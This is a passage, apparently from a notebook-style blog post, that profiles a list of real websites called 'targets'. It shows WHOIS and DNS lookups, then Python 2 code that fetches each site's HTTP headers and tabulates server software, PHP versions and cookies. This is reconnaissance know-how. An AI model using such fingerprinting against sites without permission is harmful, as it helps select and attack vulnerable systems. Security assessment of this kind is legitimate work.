Reading WHOIS for	 electrichumanproject.com
Reading WHOIS for	 tweekerchick.blogspot.com
Reading WHOIS for	 besound.com
Reading WHOIS for	 porkchopscreenprinting.com
Reading WHOIS for	 kinseyvisual.com
Reading WHOIS for	 rathergood.com
Reading WHOIS for	 lepoint.fr
Reading WHOIS for	 revhq.com
Reading WHOIS for	 poprocksandcoke.com
Reading WHOIS for	 samuraiblue.com
Reading WHOIS for	 openbsd.org
Reading WHOIS for	 sysblog.com
Reading WHOIS for	 voicesofsafety.com
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_dns = pd.concat(frames)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_dns.set_index([&#39;domain&#39;, &#39;dns_record&#39;])
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th></th>
      <th>value</th>
    </tr>
    <tr>
      <th>domain</th>
      <th>dns_record</th>
      <th></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th rowspan="2" valign="top">altpress.org</th>
      <th>NS</th>
      <td>                 dns.dadatypo.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>              dns.nothingness.org.</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">nzfortress.co.nz</th>
      <th>NS</th>
      <td>          ns-1637.awsdns-12.co.uk.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>             ns-913.awsdns-50.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>             ns-203.awsdns-25.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>            ns-1284.awsdns-32.org.</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">evillasforsale.com</th>
      <th>NS</th>
      <td>                   ns2.pcmend.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                   ns1.pcmend.net.</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">playingenemy.com</th>
      <th>NS</th>
      <td>              dns04.a2z-server.jp.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>               ns04.a2z-server.jp.</td>
    </tr>
    <tr>
      <th rowspan="8" valign="top">richardsonscharts.com</th>
      <th>NS</th>
      <td>               ns2.interbasix.net.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     207.97.239.35</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                10</td>
    </tr>
    <tr>
      <th>TXT</th>
      <td>                           "v=spf1</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                ns.interbasix.net.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                30</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                40</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                20</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">xenith.net</th>
      <th>NS</th>
      <td>          ns1.west-datacenter.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>          ns2.west-datacenter.net.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                    206.130.121.98</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                10</td>
    </tr>
    <tr>
      <th rowspan="6" valign="top">tdbrecords.com</th>
      <th>NS</th>
      <td>                ns2.dreamhost.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                ns1.dreamhost.com.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                ns3.dreamhost.com.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     75.119.220.89</td>
    </tr>
    <tr>
      <th rowspan="3" valign="top">electrichumanproject.com</th>
      <th>NS</th>
      <td>         sns41.websitewelcome.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>         sns42.websitewelcome.com.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                       67.18.68.14</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">tweekerchick.blogspot.com</th>
      <th>CNAME</th>
      <td> blogspot.l.googleusercontent.com.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     173.194.44.10</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     173.194.44.12</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     173.194.44.11</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">besound.com</th>
      <th>NS</th>
      <td>          bdns.cv.siteprotect.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>          adns.cv.siteprotect.com.</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">porkchopscreenprinting.com</th>
      <th>NS</th>
      <td>        ns1.hosting-advantage.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>        ns2.hosting-advantage.com.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                      64.92.121.42</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 5</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">kinseyvisual.com</th>
      <th>A</th>
      <td>                   205.186.183.161</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>              ns1.mediatemple.net.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                10</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>              ns2.mediatemple.net.</td>
    </tr>
    <tr>
      <th rowspan="6" valign="top">rathergood.com</th>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                ns2.dreamhost.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                ns1.dreamhost.com.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                ns3.dreamhost.com.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                      64.90.57.150</td>
    </tr>
    <tr>
      <th rowspan="3" valign="top">lepoint.fr</th>
      <th>NS</th>
      <td>                  c.dns.gandi.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                  b.dns.gandi.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                  a.dns.gandi.net.</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">revhq.com</th>
      <th>NS</th>
      <td>                  ns1.cloudns.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                  ns4.cloudns.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                  ns3.cloudns.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                  ns2.cloudns.net.</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">poprocksandcoke.com</th>
      <th>A</th>
      <td>                   184.164.147.132</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                    ns3.webdns.pw.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                    ns4.webdns.pw.</td>
    </tr>
    <tr>
      <th rowspan="5" valign="top">samuraiblue.com</th>
      <th>NS</th>
      <td>               dns1.anhosting.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>               dns2.anhosting.com.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>TXT</th>
      <td>                           "v=spf1</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                   174.127.110.249</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">openbsd.org</th>
      <th>NS</th>
      <td>                     c.ns.bsws.de.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>               ns2.superblock.net.</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     129.128.5.194</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                     a.ns.bsws.de.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>               ns1.superblock.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                 ns.sigmasoft.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                  ns1.telstra.net.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>                   zeus.theos.com.</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                10</td>
    </tr>
    <tr>
      <th>MX</th>
      <td>                                 6</td>
    </tr>
    <tr>
      <th rowspan="3" valign="top">sysblog.com</th>
      <th>MX</th>
      <td>                                 0</td>
    </tr>
    <tr>
      <th>A</th>
      <td>                     66.151.181.49</td>
    </tr>
    <tr>
      <th>TXT</th>
      <td>                           "v=spf1</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">voicesofsafety.com</th>
      <th>NS</th>
      <td>           clickme.click2site.com.</td>
    </tr>
    <tr>
      <th>NS</th>
      <td>          clickme2.click2site.com.</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="connect-to-targets">Connect to targets</h2>
<p>For every single target I&rsquo;ll connect to it per HTTP(s) using <code>urllib2</code> and store the HTTP headers.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
import urllib2
import httplib


c_targets = [t for t in targets[&#39;Target&#39;][:20]]
frames = []

# Collect here all URLs failed to connect to
error_urls = []

def send_request(target, data):
    &#34;&#34;&#34; Sends a single request to the target &#34;&#34;&#34;            
    
    # Set own headers
    headers = {&#39;User-Agent&#39; : &#39;Mozilla 5.10&#39;}

    # Create request
    request = urllib2.Request(target, None, headers)
    
    # Default response
    response = None
        
    try:
        # Send request
        response = urllib2.urlopen(request, timeout=5)
        
        # Add headers
        for h in response.info():
            data.append([target, response.code, h, response.info()[h]])
        
    except urllib2.HTTPError, e:
        print(&#39;[ERROR] HTTPError = &#39; + str(e.code))
        data.append([target, e.code, &#39;&#39;, &#39;&#39;])
            
    except urllib2.URLError, e:
        print(&#39;[ERROR] URLError = &#39; + str(e.reason))
        data.append([target, e.reason, &#39;&#39;, &#39;&#39;])
            
    except ValueError, e:
        # Most probably the target didn&#39;t have any schema
        # So send the request again with HTTP
        error_urls.append(target)
        print(&#39;[ERROR] ValueError = &#39; + e.message)
            
    except httplib.HTTPException, e:
        print(&#39;[ERROR] HTTPException&#39;)
            
    except Exception:
        import traceback
        print(&#39;[ERROR] Exception: &#39; + traceback.format_exc())
        
    finally:
        return response
        

    
    
def open_connection(targets):
    &#34;&#34;&#34; Iterate through targets and send requests &#34;&#34;&#34;
    data = []
    for t in targets:
        print(&#34;Connecting to\t %s&#34; % t)
        
        response = send_request(t, data)
        
    # Create DF only if data is not empty
    if data:
        df = pd.DataFrame(data, columns=[&#39;url&#39;, &#39;response&#39;, &#39;header&#39;, &#39;value&#39;])
        frames.append(df)    
        

# Open connection to targets and collect information
open_connection(c_targets)

# If there are any urls not having been tested, then
# prepend http:// to &lt;target&gt; and run again
new_targets =  [&#34;http://&#34;+u for u in error_urls]
open_connection(new_targets)
</code></pre></div><pre><code>Connecting to	 http://www.altpress.org/
Connecting to	 http://www.nzfortress.co.nz
Connecting to	 http://www.evillasforsale.com
Connecting to	 http://www.playingenemy.com/
[ERROR] URLError = timed out
Connecting to	 http://www.richardsonscharts.com
Connecting to	 http://www.xenith.net
[ERROR] Exception: Traceback (most recent call last):
  File &quot;&lt;ipython-input-19-d057092f77b5&gt;&quot;, line 26, in send_request
    response = urllib2.urlopen(request, timeout=5)
  File &quot;/usr/lib/python2.7/urllib2.py&quot;, line 127, in urlopen
    return _opener.open(url, data, timeout)
  File &quot;/usr/lib/python2.7/urllib2.py&quot;, line 401, in open
    response = self._open(req, data)
  File &quot;/usr/lib/python2.7/urllib2.py&quot;, line 419, in _open
    '_open', req)
  File &quot;/usr/lib/python2.7/urllib2.py&quot;, line 379, in _call_chain
    result = func(*args)
  File &quot;/usr/lib/python2.7/urllib2.py&quot;, line 1211, in http_open
    return self.do_open(httplib.HTTPConnection, req)
  File &quot;/usr/lib/python2.7/urllib2.py&quot;, line 1184, in do_open
    r = h.getresponse(buffering=True)
  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1034, in getresponse
    response.begin()
  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 407, in begin
    version, status, reason = self._read_status()
  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 365, in _read_status
    line = self.fp.readline()
  File &quot;/usr/lib/python2.7/socket.py&quot;, line 447, in readline
    data = self._sock.recv(self._rbufsize)
timeout: timed out

Connecting to	 http://www.tdbrecords.com
Connecting to	 http://www.electrichumanproject.com/
Connecting to	 http://tweekerchick.blogspot.com/
Connecting to	 http://www.besound.com/pushead/home.html
Connecting to	 http://www.porkchopscreenprinting.com/
Connecting to	 http://www.kinseyvisual.com
Connecting to	 http://www.rathergood.com
Connecting to	 http://www.lepoint.fr/
Connecting to	 http://www.revhq.com
Connecting to	 http://www.poprocksandcoke.com
Connecting to	 http://www.samuraiblue.com/
Connecting to	 http://www.openbsd.org/cgi-bin/man.cgi
Connecting to	 http://www.sysblog.com
Connecting to	 http://www.voicesofsafety.com
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_connection = pd.concat(frames)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_connection.set_index([&#39;url&#39;, &#39;response&#39;, &#39;header&#39;])
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th></th>
      <th></th>
      <th>value</th>
    </tr>
    <tr>
      <th>url</th>
      <th>response</th>
      <th>header</th>
      <th></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th rowspan="13" valign="top">http://www.altpress.org/</th>
      <th rowspan="13" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               24576</td>
    </tr>
    <tr>
      <th>x-powered-by</th>
      <td>                                                                               PHP/5.2.4-2ubuntu5.27</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                                  PHPSESSID=1498f60d82d31ec081debde379e605eb; path=/</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Thu, 19 Nov 1981 08:52:00 GMT</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                                     Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>         Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.27 with Suhosin-Patch mod_ssl/2.2.8 OpenSSL/0.9.8g</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Wed, 06 Aug 2014 11:42:08 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>etag</th>
      <td>                                                                  "8ea9fc88e045b56cd96e6fc8b487cbd9"</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                                                              public,must-revalidate</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:44:55 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=utf-8</td>
    </tr>
    <tr>
      <th rowspan="11" valign="top">http://www.nzfortress.co.nz</th>
      <th rowspan="11" valign="top">200</th>
      <th>x-powered-by</th>
      <td>                                                                               PHP/5.3.10-1ubuntu3.6</td>
    </tr>
    <tr>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td> bblastvisit=1407325495; expires=Thu, 06-Aug-2015 11:44:55 GMT; path=/, bblastactivity=0; expires...</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                          Accept-Encoding,User-Agent</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                              Apache/2.2.22 (Ubuntu)</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>x-ua-compatible</th>
      <td>                                                                                                IE=7</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                             private</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                                                                             private</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:44:55 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                       text/html; charset=ISO-8859-1</td>
    </tr>
    <tr>
      <th rowspan="9" valign="top">http://www.evillasforsale.com</th>
      <th rowspan="9" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               14610</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                               bytes</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                          Accept-Encoding,User-Agent</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                            Apache/2</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Thu, 21 Jan 2010 13:33:43 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>etag</th>
      <td>                                                                        "2040cf7-3912-47dacc06c1bc0"</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:46:01 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th>http://www.playingenemy.com/</th>
      <th>timed out</th>
      <th></th>
      <td>                                                                                                    </td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">http://www.richardsonscharts.com</th>
      <th rowspan="10" valign="top">200</th>
      <th>x-powered-by</th>
      <td>                                                                                            PleskLin</td>
    </tr>
    <tr>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                                        PHPSESSID=8cg77frbg8biv0ru8m7udb6877; path=/</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Thu, 19 Nov 1981 08:52:00 GMT</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                      no-store, no-cache, must-revalidate, post-check=0, pre-check=0</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:00 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="9" valign="top">http://www.tdbrecords.com</th>
      <th rowspan="9" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                                2600</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                               bytes</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                                     Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Mon, 03 Oct 2011 00:02:54 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>etag</th>
      <td>                                                                                 "a28-4ae59b253c780"</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:46:45 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="8" valign="top">http://www.electrichumanproject.com/</th>
      <th rowspan="8" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               14683</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                               bytes</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                                     Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Tue, 05 Aug 2014 18:19:00 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:06 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="11" valign="top">http://tweekerchick.blogspot.com/</th>
      <th rowspan="11" valign="top">200</th>
      <th>alternate-protocol</th>
      <td>                                                                                             80:quic</td>
    </tr>
    <tr>
      <th>x-xss-protection</th>
      <td>                                                                                       1; mode=block</td>
    </tr>
    <tr>
      <th>x-content-type-options</th>
      <td>                                                                                             nosniff</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:06 GMT</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                                 GSE</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Wed, 06 Aug 2014 05:34:08 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>etag</th>
      <td>                                                              "d6b75768-8b38-4991-b414-a06cc4608563"</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                                                                  private, max-age=0</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:06 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=UTF-8</td>
    </tr>
    <tr>
      <th rowspan="8" valign="top">http://www.besound.com/pushead/home.html</th>
      <th rowspan="8" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                                3870</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                               bytes</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Fri, 09 Jun 2006 04:34:30 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>etag</th>
      <td>                                                                                 "f1e-415c31dd2c180"</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:07 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="11" valign="top">http://www.porkchopscreenprinting.com/</th>
      <th rowspan="11" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               11811</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                                                                     HttpOnly;Secure</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                               bytes</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:27 GMT</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>last-modified</th>
      <td>                                                                       Tue, 28 Aug 2012 17:44:17 GMT</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>etag</th>
      <td>                                                                              "b893e5-2e23-503d0371"</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                                                                          max-age=20</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:07 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="11" valign="top">http://www.kinseyvisual.com</th>
      <th rowspan="11" valign="top">200</th>
      <th>x-powered-by</th>
      <td>                                                                                          PHP/5.3.27</td>
    </tr>
    <tr>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                                  PHPSESSID=b5f9f0af80bf4e08f41eeb02be6e6ad1; path=/</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Thu, 19 Nov 1981 08:52:00 GMT</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                          User-Agent,Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                       Apache/2.2.22</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                      no-store, no-cache, must-revalidate, post-check=0, pre-check=0</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:08 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="11" valign="top">http://www.rathergood.com</th>
      <th rowspan="11" valign="top">200</th>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                 c6ef959f4780c6a62e86c7a2d2e5ccea=4ilfnp83k67evmmn281i9qcnu3; path=/</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                                     Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                                                       no-cache, max-age=0, no-cache</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:08 GMT</td>
    </tr>
    <tr>
      <th>p3p</th>
      <td>                                                  CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=utf-8</td>
    </tr>
    <tr>
      <th>x-mod-pagespeed</th>
      <td>                                                                                       1.6.29.7-3566</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">http://www.lepoint.fr/</th>
      <th rowspan="10" valign="top">200</th>
      <th>x-xss-protection</th>
      <td>                                                                                       1; mode=block</td>
    </tr>
    <tr>
      <th>x-content-type-options</th>
      <td>                                                                                             nosniff</td>
    </tr>
    <tr>
      <th>x-powered-by</th>
      <td>                                                                                           PHP/5.5.9</td>
    </tr>
    <tr>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                          User-Agent,Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                      Apache/2.2.25 (Unix) PHP/5.5.9</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:09 GMT</td>
    </tr>
    <tr>
      <th>x-frame-options</th>
      <td>                                                                                          SAMEORIGIN</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="11" valign="top">http://www.revhq.com</th>
      <th rowspan="11" valign="top">200</th>
      <th>x-powered-by</th>
      <td>                                                                  Atari TT posix / Python / php 5.3x</td>
    </tr>
    <tr>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                                        PHPSESSID=e1jmcg9c2pgbi9rhgcdkhq5ge4; path=/</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Thu, 19 Nov 1981 08:52:00 GMT</td>
    </tr>
    <tr>
      <th>vary</th>
      <td>                                                                                     Accept-Encoding</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                       Apache/2.2.22</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                      no-store, no-cache, must-revalidate, post-check=0, pre-check=0</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:19 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th rowspan="7" valign="top">http://www.poprocksandcoke.com</th>
      <th rowspan="7" valign="top">200</th>
      <th>x-powered-by</th>
      <td>                                                                                          PHP/5.3.24</td>
    </tr>
    <tr>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:10 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=UTF-8</td>
    </tr>
    <tr>
      <th>x-pingback</th>
      <td>                                                           http://www.poprocksandcoke.com/xmlrpc.php</td>
    </tr>
    <tr>
      <th rowspan="7" valign="top">http://www.samuraiblue.com/</th>
      <th rowspan="7" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               54005</td>
    </tr>
    <tr>
      <th>x-powered-by</th>
      <td>                                                                                          PHP/5.4.31</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:12 GMT</td>
    </tr>
